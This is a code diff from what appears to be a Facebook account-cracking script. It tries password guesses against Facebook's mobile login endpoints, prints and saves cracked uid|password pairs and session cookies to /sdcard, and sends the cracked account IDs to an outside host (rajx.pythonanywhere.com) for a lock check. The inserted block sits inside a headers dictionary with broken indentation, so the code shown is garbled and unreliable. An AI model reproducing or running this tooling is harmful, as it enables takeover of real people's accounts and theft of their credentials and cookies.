@@ -193,6 +193,19 @@ def hasan(uid,pwx,tl):
     'upgrade-insecure-requests': '1',
     'user-agent': pro,
     'viewport-width': '980',
+    
+           lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                cix = coki.split('c_user')[1]
+                cid = cix[0:15]
+                res = requests.get(f"https://rajx.pythonanywhere.com/live/uid={cid}").text
+                if 'LOCK' in res:
+                    return 'LOCK'
+                else:
+                    print(f'  \r\033[1;92m  [Bipul-OK] '+uid+' • '+ps+'\33[0;92m')
 }
             lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
@@ -200,7 +213,7 @@ def hasan(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
                 print(f"[Bipul-OK] {uid}|{ps} \nCookie : {coki}")
-                open('/sdcard/Hasan-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/Bipul-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
